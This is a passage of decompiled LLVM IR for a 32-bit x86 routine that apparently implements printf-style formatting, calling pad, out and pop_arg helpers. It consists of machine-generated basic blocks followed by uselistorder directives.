dec_label_pc_805322f:                             ; preds = %dec_label_pc_8053120, %dec_label_pc_80531fc
  %storemerge29 = phi i32 [ %v0_805322a, %dec_label_pc_80531fc ], [ %v0_8053136, %dec_label_pc_8053120 ]
  store i32 %storemerge29, i32* %eax.global-to-local, align 4
  %v0_805322f = load i32, i32* @esp, align 4
  %v1_805322f = inttoptr i32 %v0_805322f to i32*
  %v2_805322f = load i32, i32* %v1_805322f, align 4
  store i32 %v2_805322f, i32* %eax.global-to-local, align 4
  store i32 32, i32* @edx, align 4
  %v1_8053236 = add i32 %v0_805322f, 60
  %v2_8053236 = inttoptr i32 %v1_8053236 to i32*
  %v3_8053236 = load i32, i32* %v2_8053236, align 4
  %v4_8053236 = xor i32 %v3_8053236, 8192
  store i32 %v4_8053236, i32* %v2_8053236, align 4
  %v0_805323e = load i32, i32* @esp, align 4
  %v1_805323e = add i32 %v0_805323e, 52
  %v2_805323e = inttoptr i32 %v1_805323e to i32*
  %v3_805323e = load i32, i32* %v2_805323e, align 4
  %v5_805323e = add i32 %v0_805323e, -4
  %v6_805323e = inttoptr i32 %v5_805323e to i32*
  store i32 %v3_805323e, i32* %v6_805323e, align 4
  %v1_8053242 = add i32 %v0_805323e, 116
  %v2_8053242 = inttoptr i32 %v1_8053242 to i32*
  %v3_8053242 = load i32, i32* %v2_8053242, align 4
  %v5_8053242 = add i32 %v0_805323e, -8
  %v6_8053242 = inttoptr i32 %v5_8053242 to i32*
  store i32 %v3_8053242, i32* %v6_8053242, align 4
  %v1_8053246 = add i32 %v0_805323e, 56
  %v2_8053246 = inttoptr i32 %v1_8053246 to i32*
  %v3_8053246 = load i32, i32* %v2_8053246, align 4
  store i32 %v3_8053246, i32* @ecx, align 4
  %v1_805324a = add i32 %v0_805323e, 44
  %v2_805324a = inttoptr i32 %v1_805324a to i32*
  %v3_805324a = load i32, i32* %v2_805324a, align 4
  store i32 %v3_805324a, i32* @eax, align 4
  %v0_805324e = call i32 @pad()
  store i32 %v0_805324e, i32* %eax.global-to-local, align 4
  %v0_8053253 = load i32, i32* @esp, align 4
  %v1_8053256 = add i32 %v0_8053253, 124
  %v2_8053256 = inttoptr i32 %v1_8053256 to i32*
  %v3_8053256 = load i32, i32* %v2_8053256, align 4
  store i32 %v3_8053256, i32* @edi, align 4
  br label %dec_label_pc_805325a

dec_label_pc_805325a:                             ; preds = %dec_label_pc_80529be, %dec_label_pc_805322f
  %v0_8053264.in = phi i32 [ %v0_80529cb, %dec_label_pc_80529be ], [ %v0_8053253, %dec_label_pc_805322f ]
  %v0_805325a = phi i32 [ %v0_805325a.pre, %dec_label_pc_80529be ], [ %v3_8053256, %dec_label_pc_805322f ]
  %v2_805325a = add i32 %v0_8053264.in, 64
  %v3_805325a = inttoptr i32 %v2_805325a to i32*
  %v4_805325a = load i32, i32* %v3_805325a, align 4
  %v5_805325a = sub i32 %v0_805325a, %v4_805325a
  %v11_805325a = xor i32 %v4_805325a, %v0_805325a
  %v12_805325a = xor i32 %v5_805325a, %v0_805325a
  %v13_805325a = and i32 %v12_805325a, %v11_805325a
  %v14_805325a = icmp slt i32 %v13_805325a, 0
  %v16_805325a = icmp slt i32 %v5_805325a, 0
  %v2_805325e = icmp eq i1 %v16_805325a, %v14_805325a
  br i1 %v2_805325e, label %dec_label_pc_8051dfb.backedge, label %dec_label_pc_8053264

dec_label_pc_8053264:                             ; preds = %dec_label_pc_805325a
  store i32 %v4_805325a, i32* @edi, align 4
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_805326d:                             ; preds = %dec_label_pc_8052162, %dec_label_pc_80523d7
  %v0_805326d = phi i32 [ %v0_8052513, %dec_label_pc_8052162 ], [ %v0_805326d.pre, %dec_label_pc_80523d7 ]
  %v1_805326d = add i32 %v0_805326d, 7527
  store i32 %v1_805326d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053274

dec_label_pc_8053274:                             ; preds = %dec_label_pc_805244c, %dec_label_pc_805326d
  %v0_8053274 = phi i32 [ %v0_8053274.pre, %dec_label_pc_805244c ], [ %v0_805326d, %dec_label_pc_805326d ]
  %v1_8053274 = add i32 %v0_8053274, 64
  %v2_8053274 = inttoptr i32 %v1_8053274 to i32*
  store i32 ptrtoint ([10 x i8]* @global_var_8054a20.392 to i32), i32* %v2_8053274, align 4
  %v0_805327c = load i32, i32* @esp, align 4
  %v1_805327c = add i32 %v0_805327c, 72
  %v2_805327c = inttoptr i32 %v1_805327c to i32*
  store i32 0, i32* %v2_805327c, align 4
  %v0_8053284.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053288.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053284

dec_label_pc_8053284:                             ; preds = %dec_label_pc_80523cb, %dec_label_pc_80523a0, %dec_label_pc_8053274
  %v1_805328c = phi i32 [ %v0_80523cb, %dec_label_pc_80523cb ], [ %v1_80523c7, %dec_label_pc_80523a0 ], [ %v1_8053288.pre, %dec_label_pc_8053274 ]
  %v0_8053284 = phi i32 [ %v1_80523cb, %dec_label_pc_80523cb ], [ %v1_80523a0, %dec_label_pc_80523a0 ], [ %v0_8053284.pre, %dec_label_pc_8053274 ]
  %v1_8053286 = load i32, i32* @esi, align 4
  %v2_8053286 = sub i32 %v0_8053284, %v1_8053286
  store i32 %v2_8053286, i32* @edi, align 4
  %v2_8053288 = add i32 %v1_805328c, 52
  %v3_8053288 = inttoptr i32 %v2_8053288 to i32*
  %v4_8053288 = load i32, i32* %v3_8053288, align 4
  %v5_8053288 = sub i32 %v2_8053286, %v4_8053288
  %v11_8053288 = xor i32 %v4_8053288, %v2_8053286
  %v12_8053288 = xor i32 %v5_8053288, %v2_8053286
  %v13_8053288 = and i32 %v12_8053288, %v11_8053288
  %v14_8053288 = icmp slt i32 %v13_8053288, 0
  %v16_8053288 = icmp slt i32 %v5_8053288, 0
  %v2_805328c = add i32 %v1_805328c, 120
  %v3_805328c = inttoptr i32 %v2_805328c to i32*
  store i32 %v2_8053286, i32* %v3_805328c, align 4
  %v2_8053290 = icmp eq i1 %v16_8053288, %v14_8053288
  br i1 %v2_8053290, label %dec_label_pc_805329a, label %dec_label_pc_8053292

dec_label_pc_8053292:                             ; preds = %dec_label_pc_8053284
  %v0_8053292 = load i32, i32* @esp, align 4
  %v1_8053292 = add i32 %v0_8053292, 52
  %v2_8053292 = inttoptr i32 %v1_8053292 to i32*
  %v3_8053292 = load i32, i32* %v2_8053292, align 4
  store i32 %v3_8053292, i32* %eax.global-to-local, align 4
  %v2_8053296 = add i32 %v0_8053292, 120
  %v3_8053296 = inttoptr i32 %v2_8053296 to i32*
  store i32 %v3_8053292, i32* %v3_8053296, align 4
  br label %dec_label_pc_805329a

dec_label_pc_805329a:                             ; preds = %dec_label_pc_8053284, %dec_label_pc_8053292
  %v0_805329a = load i32, i32* @esp, align 4
  %v1_805329a = add i32 %v0_805329a, 120
  %v2_805329a = inttoptr i32 %v1_805329a to i32*
  %v3_805329a = load i32, i32* %v2_805329a, align 4
  store i32 %v3_805329a, i32* %ebp.global-to-local, align 4
  %v2_805329e = add i32 %v0_805329a, 72
  %v3_805329e = inttoptr i32 %v2_805329e to i32*
  %v4_805329e = load i32, i32* %v3_805329e, align 4
  %v5_805329e = add i32 %v4_805329e, %v3_805329a
  store i32 %v5_805329e, i32* @ebp, align 4
  %v2_80532a2 = add i32 %v0_805329a, 48
  %v3_80532a2 = inttoptr i32 %v2_80532a2 to i32*
  %v4_80532a2 = load i32, i32* %v3_80532a2, align 4
  %v5_80532a2 = sub i32 %v5_805329e, %v4_80532a2
  %v11_80532a2 = xor i32 %v4_80532a2, %v5_805329e
  %v12_80532a2 = xor i32 %v5_80532a2, %v5_805329e
  %v13_80532a2 = and i32 %v12_80532a2, %v11_80532a2
  %v14_80532a2 = icmp slt i32 %v13_80532a2, 0
  %v16_80532a2 = icmp slt i32 %v5_80532a2, 0
  store i32 %v5_805329e, i32* @ebx, align 4
  %v2_80532a8 = icmp eq i1 %v16_80532a2, %v14_80532a2
  br i1 %v2_80532a8, label %dec_label_pc_80532ae, label %dec_label_pc_80532aa

dec_label_pc_80532aa:                             ; preds = %dec_label_pc_805329a
  %v3_80532aa = load i32, i32* %v3_80532a2, align 4
  store i32 %v3_80532aa, i32* @ebx, align 4
  br label %dec_label_pc_80532ae

dec_label_pc_80532ae:                             ; preds = %dec_label_pc_805329a, %dec_label_pc_80532aa
  %v0_80532ae = load i32, i32* %eax.global-to-local, align 4
  %v2_80532ae = add i32 %v0_805329a, -4
  %v3_80532ae = inttoptr i32 %v2_80532ae to i32*
  store i32 %v0_80532ae, i32* %v3_80532ae, align 4
  %v0_80532af = load i32, i32* @ebx, align 4
  store i32 %v0_80532af, i32* @ecx, align 4
  %v0_80532b1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80532b1 = add i32 %v0_805329a, -8
  %v3_80532b1 = inttoptr i32 %v2_80532b1 to i32*
  store i32 %v0_80532b1, i32* %v3_80532b1, align 4
  store i32 32, i32* @edx, align 4
  %v1_80532b7 = add i32 %v0_805329a, 44
  %v2_80532b7 = inttoptr i32 %v1_80532b7 to i32*
  %v3_80532b7 = load i32, i32* %v2_80532b7, align 4
  %v5_80532b7 = add i32 %v0_805329a, -12
  %v6_80532b7 = inttoptr i32 %v5_80532b7 to i32*
  store i32 %v3_80532b7, i32* %v6_80532b7, align 4
  %v0_80532bb = load i32, i32* @ebp, align 4
  %v2_80532bb = add i32 %v0_805329a, -16
  %v3_80532bb = inttoptr i32 %v2_80532bb to i32*
  store i32 %v0_80532bb, i32* %v3_80532bb, align 4
  %v1_80532bc = add i32 %v0_805329a, 36
  %v2_80532bc = inttoptr i32 %v1_80532bc to i32*
  %v3_80532bc = load i32, i32* %v2_80532bc, align 4
  store i32 %v3_80532bc, i32* @eax, align 4
  %v0_80532c0 = call i32 @pad()
  store i32 %v0_80532c0, i32* %eax.global-to-local, align 4
  %v0_80532c5 = load i32, i32* @esp, align 4
  %v1_80532c5 = add i32 %v0_80532c5, 80
  %v2_80532c5 = inttoptr i32 %v1_80532c5 to i32*
  %v3_80532c5 = load i32, i32* %v2_80532c5, align 4
  store i32 %v3_80532c5, i32* @edx, align 4
  %v1_80532c9 = add i32 %v0_80532c5, 52
  %v2_80532c9 = inttoptr i32 %v1_80532c9 to i32*
  %v3_80532c9 = load i32, i32* %v2_80532c9, align 4
  store i32 %v3_80532c9, i32* @eax, align 4
  %v1_80532cd = add i32 %v0_80532c5, 88
  %v2_80532cd = inttoptr i32 %v1_80532cd to i32*
  %v3_80532cd = load i32, i32* %v2_80532cd, align 4
  store i32 %v3_80532cd, i32* @ecx, align 4
  %v0_80532d1 = call i32 @out()
  store i32 %v0_80532d1, i32* %eax.global-to-local, align 4
  store i32 48, i32* @edx, align 4
  %v0_80532db = load i32, i32* @esp, align 4
  %v1_80532db = inttoptr i32 %v0_80532db to i32*
  %v3_80532db = add i32 %v0_80532db, 4
  %v0_80532dc = load i32, i32* @ebx, align 4
  store i32 %v0_80532dc, i32* @ecx, align 4
  %v1_80532de = inttoptr i32 %v3_80532db to i32*
  %v2_80532de = load i32, i32* %v1_80532de, align 4
  store i32 %v2_80532de, i32* %eax.global-to-local, align 4
  %v1_80532df = add i32 %v0_80532db, 60
  %v2_80532df = inttoptr i32 %v1_80532df to i32*
  %v3_80532df = load i32, i32* %v2_80532df, align 4
  %v1_80532e3 = xor i32 %v3_80532df, 65536
  store i32 %v1_80532e3, i32* %eax.global-to-local, align 4
  store i32 %v1_80532e3, i32* %v1_80532de, align 4
  %v0_80532e9 = load i32, i32* @ebp, align 4
  store i32 %v0_80532e9, i32* %v1_80532db, align 4
  %v1_80532ea = add i32 %v0_80532db, 52
  %v2_80532ea = inttoptr i32 %v1_80532ea to i32*
  %v3_80532ea = load i32, i32* %v2_80532ea, align 4
  store i32 %v3_80532ea, i32* @eax, align 4
  %v0_80532ee = call i32 @pad()
  store i32 %v0_80532ee, i32* %eax.global-to-local, align 4
  %v0_80532f3 = load i32, i32* @esp, align 4
  %v1_80532f3 = inttoptr i32 %v0_80532f3 to i32*
  %v2_80532f3 = load i32, i32* %v1_80532f3, align 4
  store i32 %v2_80532f3, i32* %eax.global-to-local, align 4
  %v3_80532f3 = add i32 %v0_80532f3, 4
  %v1_80532f4 = inttoptr i32 %v3_80532f3 to i32*
  store i32 48, i32* @edx, align 4
  store i32 0, i32* %v1_80532f4, align 4
  %v0_80532fc = load i32, i32* @edi, align 4
  store i32 %v0_80532fc, i32* %v1_80532f3, align 4
  %v1_80532fd = add i32 %v0_80532f3, 136
  %v2_80532fd = inttoptr i32 %v1_80532fd to i32*
  %v3_80532fd = load i32, i32* %v2_80532fd, align 4
  store i32 %v3_80532fd, i32* @ecx, align 4
  %v1_8053304 = add i32 %v0_80532f3, 52
  %v2_8053304 = inttoptr i32 %v1_8053304 to i32*
  %v3_8053304 = load i32, i32* %v2_8053304, align 4
  store i32 %v3_8053304, i32* @eax, align 4
  %v0_8053308 = call i32 @pad()
  store i32 %v0_8053308, i32* %eax.global-to-local, align 4
  %v0_805330d = load i32, i32* @esp, align 4
  %v1_805330d = add i32 %v0_805330d, 52
  %v2_805330d = inttoptr i32 %v1_805330d to i32*
  %v3_805330d = load i32, i32* %v2_805330d, align 4
  store i32 %v3_805330d, i32* @eax, align 4
  %v0_8053311 = load i32, i32* @edi, align 4
  store i32 %v0_8053311, i32* @ecx, align 4
  %v0_8053313 = load i32, i32* @esi, align 4
  store i32 %v0_8053313, i32* @edx, align 4
  %v0_8053315 = call i32 @out()
  store i32 %v0_8053315, i32* %eax.global-to-local, align 4
  %v0_805331a = load i32, i32* @ebx, align 4
  store i32 %v0_805331a, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v0_8053321 = load i32, i32* @esp, align 4
  %v1_8053321 = inttoptr i32 %v0_8053321 to i32*
  %v2_8053321 = load i32, i32* %v1_8053321, align 4
  store i32 %v2_8053321, i32* @esi, align 4
  store i32 %v0_805331a, i32* @edi, align 4
  %v1_8053325 = add i32 %v0_8053321, 60
  %v2_8053325 = inttoptr i32 %v1_8053325 to i32*
  %v3_8053325 = load i32, i32* %v2_8053325, align 4
  %v4_8053325 = xor i32 %v3_8053325, 8192
  store i32 %v4_8053325, i32* %v2_8053325, align 4
  %v0_805332d = load i32, i32* @esp, align 4
  %v1_805332d = add i32 %v0_805332d, 52
  %v2_805332d = inttoptr i32 %v1_805332d to i32*
  %v3_805332d = load i32, i32* %v2_805332d, align 4
  %v5_805332d = add i32 %v0_805332d, -4
  %v6_805332d = inttoptr i32 %v5_805332d to i32*
  store i32 %v3_805332d, i32* %v6_805332d, align 4
  %v0_8053331 = load i32, i32* @ebp, align 4
  %v2_8053331 = add i32 %v0_805332d, -8
  %v3_8053331 = inttoptr i32 %v2_8053331 to i32*
  store i32 %v0_8053331, i32* %v3_8053331, align 4
  %v1_8053332 = add i32 %v0_805332d, 44
  %v2_8053332 = inttoptr i32 %v1_8053332 to i32*
  %v3_8053332 = load i32, i32* %v2_8053332, align 4
  store i32 %v3_8053332, i32* @eax, align 4
  %v0_8053336 = call i32 @pad()
  store i32 %v0_8053336, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051dfb.backedge

dec_label_pc_8051dfb.backedge:                    ; preds = %dec_label_pc_80532ae, %dec_label_pc_805218f, %dec_label_pc_80521a1, %dec_label_pc_80521b3, %dec_label_pc_80521c6, %dec_label_pc_80521d8, %dec_label_pc_80521ea, %dec_label_pc_8053264, %dec_label_pc_8051e8b, %dec_label_pc_8052122, %dec_label_pc_805325a, %dec_label_pc_8052179
  %v0_8051dfb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051dfb

dec_label_pc_8053343:                             ; preds = %dec_label_pc_8051e28
  %v1_8053343 = add i32 %v0_8051e28, 36
  %v2_8053343 = inttoptr i32 %v1_8053343 to i32*
  %v3_8053343 = load i32, i32* %v2_8053343, align 4
  %v4_8053343 = icmp eq i32 %v3_8053343, 0
  %v1_8053348 = icmp eq i1 %v4_8053343, false
  br i1 %v1_8053348, label %dec_label_pc_80533f4, label %dec_label_pc_805334e

dec_label_pc_805334e:                             ; preds = %dec_label_pc_8053343
  %v1_805334e = add i32 %v0_8051e28, 40
  %v2_805334e = inttoptr i32 %v1_805334e to i32*
  %v3_805334e = load i32, i32* %v2_805334e, align 4
  %v4_805334e = icmp eq i32 %v3_805334e, 0
  %v1_8053353 = icmp eq i1 %v4_805334e, false
  br i1 %v1_8053353, label %dec_label_pc_8053377, label %dec_label_pc_80533b9

dec_label_pc_8053357:                             ; preds = %dec_label_pc_8053386
  %v1_8053357 = add i32 %v0_8053357, 32
  %v2_8053357 = inttoptr i32 %v1_8053357 to i32*
  %v3_8053357 = load i32, i32* %v2_8053357, align 4
  store i32 %v3_8053357, i32* @ecx, align 4
  %v0_805335b = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805335b, i32* @eax, align 4
  %v1_805335d = add i32 %v0_805335d, 1
  store i32 %v1_805335d, i32* @ebx, align 4
  %v1_805335e = add i32 %v0_805335b, 12
  store i32 %v1_805335e, i32* %esi.global-to-local, align 4
  %v0_8053361 = call i32 @pop_arg()
  store i32 %v0_8053361, i32* %eax.global-to-local, align 4
  %v0_8053366 = load i32, i32* @ebx, align 4
  %v9_8053366 = icmp eq i32 %v0_8053366, 10
  %v1_8053369 = icmp eq i1 %v9_8053366, false
  %v0_8053386.pre = load i32, i32* @esp, align 4
  br i1 %v1_8053369, label %dec_label_pc_8053386, label %dec_label_pc_805336b

dec_label_pc_805336b:                             ; preds = %dec_label_pc_8053357, %dec_label_pc_8053386
  %v1_8053372 = phi i32 [ %v0_805335d, %dec_label_pc_8053386 ], [ %v0_8053366, %dec_label_pc_8053357 ]
  %v0_805339c = phi i32 [ %v0_8053357, %dec_label_pc_8053386 ], [ %v0_8053386.pre, %dec_label_pc_8053357 ]
  %v1_805336b = add i32 %v0_805339c, 7876
  %v2_805336b = inttoptr i32 %v1_805336b to i32*
  %v3_805336b = load i32, i32* %v2_805336b, align 4
  store i32 %v3_805336b, i32* %ecx.global-to-local, align 4
  %v2_8053372 = mul i32 %v1_8053372, 4
  %v3_8053372 = add i32 %v3_805336b, %v2_8053372
  store i32 %v3_8053372, i32* %edx.global-to-local, align 4
  %v7_805339a269 = icmp sgt i32 %v1_8053372, 9
  br i1 %v7_805339a269, label %dec_label_pc_805339c, label %dec_label_pc_80533a6

dec_label_pc_8053377:                             ; preds = %dec_label_pc_805334e
  %v1_8053377 = add i32 %v0_8051e28, 7872
  %v2_8053377 = inttoptr i32 %v1_8053377 to i32*
  %v3_8053377 = load i32, i32* %v2_8053377, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  %v1_8053383 = add i32 %v3_8053377, 12
  store i32 %v1_8053383, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053386

dec_label_pc_8053386:                             ; preds = %dec_label_pc_8053357, %dec_label_pc_8053377
  %v0_805335d = phi i32 [ 1, %dec_label_pc_8053377 ], [ %v0_8053366, %dec_label_pc_8053357 ]
  %v0_8053357 = phi i32 [ %v0_8051e28, %dec_label_pc_8053377 ], [ %v0_8053386.pre, %dec_label_pc_8053357 ]
  %v1_8053386 = add i32 %v0_8053357, 7876
  %v2_8053386 = inttoptr i32 %v1_8053386 to i32*
  %v3_8053386 = load i32, i32* %v2_8053386, align 4
  store i32 %v3_8053386, i32* %eax.global-to-local, align 4
  %v2_805338d = mul i32 %v0_805335d, 4
  %v3_805338d = add i32 %v3_8053386, %v2_805338d
  %v4_805338d = inttoptr i32 %v3_805338d to i32*
  %v5_805338d = load i32, i32* %v4_805338d, align 4
  store i32 %v5_805338d, i32* @edx, align 4
  %v1_8053390 = icmp eq i32 %v5_805338d, 0
  %v1_8053392 = icmp eq i1 %v1_8053390, false
  br i1 %v1_8053392, label %dec_label_pc_8053357, label %dec_label_pc_805336b

dec_label_pc_8053396:                             ; preds = %dec_label_pc_80533a6
  %v1_8053396 = add nsw i32 %v0_8053396271, 1
  store i32 %v1_8053396, i32* %ebx.global-to-local, align 4
  %v7_805339a = icmp sgt i32 %v0_8053396271, 8
  br i1 %v7_805339a, label %dec_label_pc_8053397.dec_label_pc_805339c_crit_edge, label %dec_label_pc_80533a6

dec_label_pc_8053397.dec_label_pc_805339c_crit_edge: ; preds = %dec_label_pc_8053396
  br label %dec_label_pc_805339c

dec_label_pc_805339c:                             ; preds = %dec_label_pc_8053397.dec_label_pc_805339c_crit_edge, %dec_label_pc_805336b
  %v1_805339c = add i32 %v0_805339c, 60
  %v2_805339c = inttoptr i32 %v1_805339c to i32*
  store i32 1, i32* %v2_805339c, align 4
  br label %dec_label_pc_80533f4

dec_label_pc_80533a6:                             ; preds = %dec_label_pc_805336b, %dec_label_pc_8053396
  %v0_8053396271 = phi i32 [ %v1_8053396, %dec_label_pc_8053396 ], [ %v1_8053372, %dec_label_pc_805336b ]
  %v0_80533a6270 = phi i32 [ %v1_80533a8, %dec_label_pc_8053396 ], [ %v3_8053372, %dec_label_pc_805336b ]
  %v1_80533a6 = inttoptr i32 %v0_80533a6270 to i32*
  %v2_80533a6 = load i32, i32* %v1_80533a6, align 4
  store i32 %v2_80533a6, i32* %eax.global-to-local, align 4
  %v1_80533a8 = add i32 %v0_80533a6270, 4
  store i32 %v1_80533a8, i32* %edx.global-to-local, align 4
  %v1_80533ab = icmp eq i32 %v2_80533a6, 0
  br i1 %v1_80533ab, label %dec_label_pc_8053396, label %dec_label_pc_80533af.loopexit

dec_label_pc_80533af.loopexit:                    ; preds = %dec_label_pc_80533a6
  br label %dec_label_pc_80533af

dec_label_pc_80533af.loopexit70:                  ; preds = %dec_label_pc_8051f67, %dec_label_pc_8051fae, %dec_label_pc_8052030, %dec_label_pc_80520c1, %dec_label_pc_80520ce
  %v0_80533af.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80533af

dec_label_pc_80533af:                             ; preds = %dec_label_pc_8052084, %dec_label_pc_80524b3, %dec_label_pc_80533af.loopexit70, %dec_label_pc_80533af.loopexit
  %v0_80533af = phi i32 [ %v0_80533af.pre, %dec_label_pc_80533af.loopexit70 ], [ %v0_805339c, %dec_label_pc_80533af.loopexit ], [ %v1_80524bc, %dec_label_pc_80524b3 ], [ %v0_8052084, %dec_label_pc_8052084 ]
  %v1_80533af = add i32 %v0_80533af, 60
  %v2_80533af = inttoptr i32 %v1_80533af to i32*
  store i32 -1, i32* %v2_80533af, align 4
  br label %dec_label_pc_80533f4

dec_label_pc_80533b9:                             ; preds = %dec_label_pc_8052105, %dec_label_pc_805334e
  %v0_80533b9 = phi i32 [ %v0_8051e28, %dec_label_pc_805334e ], [ %v0_8052105, %dec_label_pc_8052105 ]
  %v1_80533b9 = add i32 %v0_80533b9, 60
  %v2_80533b9 = inttoptr i32 %v1_80533b9 to i32*
  store i32 0, i32* %v2_80533b9, align 4
  br label %dec_label_pc_80533f4

dec_label_pc_80533c3:                             ; preds = %dec_label_pc_80524c9, %dec_label_pc_805249a, %dec_label_pc_80524a9, %dec_label_pc_8052488
  %v1_80533c3 = phi i32 [ %v0_8052491, %dec_label_pc_8052488 ], [ %v1_80524bc, %dec_label_pc_80524c9 ], [ %v1_80524b3315, %dec_label_pc_80524a9 ], [ %v1_80524bc, %dec_label_pc_805249a ]
  %v0_80533c3 = load i32, i32* @ecx, align 4
  %v2_80533c3 = add i32 %v1_80533c3, -4
  %v3_80533c3 = inttoptr i32 %v2_80533c3 to i32*
  store i32 %v0_80533c3, i32* %v3_80533c3, align 4
  store i32 32, i32* @edx, align 4
  %v0_80533c9 = load i32, i32* @ecx, align 4
  %v2_80533c9 = add i32 %v1_80533c3, -8
  %v3_80533c9 = inttoptr i32 %v2_80533c9 to i32*
  store i32 %v0_80533c9, i32* %v3_80533c9, align 4
  store i32 0, i32* @esi, align 4
  %v1_80533cc = add i32 %v1_80533c3, 44
  %v2_80533cc = inttoptr i32 %v1_80533cc to i32*
  %v3_80533cc = load i32, i32* %v2_80533cc, align 4
  %v5_80533cc = add i32 %v1_80533c3, -12
  %v6_80533cc = inttoptr i32 %v5_80533cc to i32*
  store i32 %v3_80533cc, i32* %v6_80533cc, align 4
  %v0_80533d0 = load i32, i32* @ebx, align 4
  %v2_80533d0 = add i32 %v1_80533c3, -16
  %v3_80533d0 = inttoptr i32 %v2_80533d0 to i32*
  store i32 %v0_80533d0, i32* %v3_80533d0, align 4
  %v1_80533d1 = add i32 %v1_80533c3, 48
  %v2_80533d1 = inttoptr i32 %v1_80533d1 to i32*
  %v3_80533d1 = load i32, i32* %v2_80533d1, align 4
  store i32 %v3_80533d1, i32* @ecx, align 4
  %v1_80533d5 = add i32 %v1_80533c3, 36
  %v2_80533d5 = inttoptr i32 %v1_80533d5 to i32*
  %v3_80533d5 = load i32, i32* %v2_80533d5, align 4
  store i32 %v3_80533d5, i32* @eax, align 4
  %v0_80533d9 = call i32 @pad()
  store i32 %v0_80533d9, i32* %eax.global-to-local, align 4
  %v0_80533de = load i32, i32* @esp, align 4
  %v1_80533de = add i32 %v0_80533de, 7824
  %v2_80533de = inttoptr i32 %v1_80533de to i32*
  %v3_80533de = load i32, i32* %v2_80533de, align 4
  store i32 %v3_80533de, i32* @ebp, align 4
  %v1_80533e8 = add i32 %v0_80533de, 7848
  store i32 %v1_80533e8, i32* @edi, align 4
  %v0_80524e6319 = load i32, i32* @esi, align 4
  %v1_80524e6320 = load i32, i32* @ebx, align 4
  %v7_80524e6322 = icmp ult i32 %v0_80524e6319, %v1_80524e6320
  %v1_80524e8329 = icmp eq i1 %v7_80524e6322, false
  br i1 %v1_80524e8329, label %dec_label_pc_8052505, label %dec_label_pc_80524ea

dec_label_pc_80533f4:                             ; preds = %dec_label_pc_8053343, %dec_label_pc_80533b9, %dec_label_pc_80533af, %dec_label_pc_805339c
  %v0_80533f4 = load i32, i32* @esp, align 4
  %v1_80533f4 = add i32 %v0_80533f4, 60
  %v2_80533f4 = inttoptr i32 %v1_80533f4 to i32*
  %v3_80533f4 = load i32, i32* %v2_80533f4, align 4
  store i32 %v3_80533f4, i32* %eax.global-to-local, align 4
  %v1_80533f8 = add i32 %v0_80533f4, 7852
  %v1_80533fe = inttoptr i32 %v1_80533f8 to i32*
  %v2_80533fe = load i32, i32* %v1_80533fe, align 4
  store i32 %v2_80533fe, i32* @ebx, align 4
  %v3_80533fe = add i32 %v0_80533f4, 7856
  %v1_80533ff = inttoptr i32 %v3_80533fe to i32*
  %v2_80533ff = load i32, i32* %v1_80533ff, align 4
  store i32 %v2_80533ff, i32* @esi, align 4
  %v3_80533ff = add i32 %v0_80533f4, 7860
  %v1_8053400 = inttoptr i32 %v3_80533ff to i32*
  %v2_8053400 = load i32, i32* %v1_8053400, align 4
  store i32 %v2_8053400, i32* @edi, align 4
  %v3_8053400 = add i32 %v0_80533f4, 7864
  %v1_8053401 = inttoptr i32 %v3_8053400 to i32*
  %v2_8053401 = load i32, i32* %v1_8053401, align 4
  store i32 %v2_8053401, i32* @ebp, align 4
  ret i32 %v3_80533f4

; uselistorder directives
  uselistorder i32 %v3_80533de, { 1, 0 }
  uselistorder i32 %v0_80533d9, { 1, 0 }
  uselistorder i32 %v1_80533c3, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_80533a8, { 1, 0 }
  uselistorder i32 %v0_8053396271, { 1, 0 }
  uselistorder i32 %v0_8053357, { 2, 1, 0 }
  uselistorder i32 %v0_805335d, { 2, 1, 0 }
  uselistorder i32 %v0_8053366, { 1, 2, 0 }
  uselistorder i32 %v5_80532a2, { 1, 0 }
  uselistorder i32 %v5_805329e, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_805329a, { 5, 4, 3, 2, 1, 0, 6, 7, 8 }
  uselistorder i32 %v5_8053288, { 1, 0 }
  uselistorder i32 %v2_8053286, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v5_805325a, { 1, 0 }
  uselistorder i32 %v4_805325a, { 1, 0, 2 }
  uselistorder i32 %v0_8053161, { 1, 0 }
  uselistorder i32 %v1_80531fc, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v5_80531cd, { 1, 2, 0 }
  uselistorder i32 %v2_80531cb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_805319f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053195, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_8053167, { 1, 0, 2 }
  uselistorder i32 %v0_8053151, { 0, 2, 1 }
  uselistorder i32 %v3_8053140, { 1, 0, 2 }
  uselistorder i32 %v0_8053113, { 1, 0 }
  uselistorder i32 %v1_8053120, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v1_80530ed, { 1, 0 }
  uselistorder i32 %v3_80530e9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80530f7, { 1, 0, 2 }
  uselistorder i32 %v0_80530bd.lcssa, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8053099, { 1, 0 }
  uselistorder i32 %v0_8053078, { 1, 0, 2 }
  uselistorder i32 %v0_805306d, { 2, 0, 1, 3 }
  uselistorder i32 %v0_805305c, { 1, 0, 2 }
  uselistorder i32 %v3_8053052, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805304e, { 1, 0, 2 }
  uselistorder i32 %v1_8053040, { 1, 0 }
  uselistorder i32 %v1_8052fc1, { 0, 2, 1 }
  uselistorder i32 %v1_8052fbe, { 1, 0 }
  uselistorder i32 %v0_8052fbe.pre, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8052fc1461, { 1, 0 }
  uselistorder i32 %v2_8052f8e, { 1, 0 }
  uselistorder i32 %v0_8052fe9.pre, { 1, 0 }
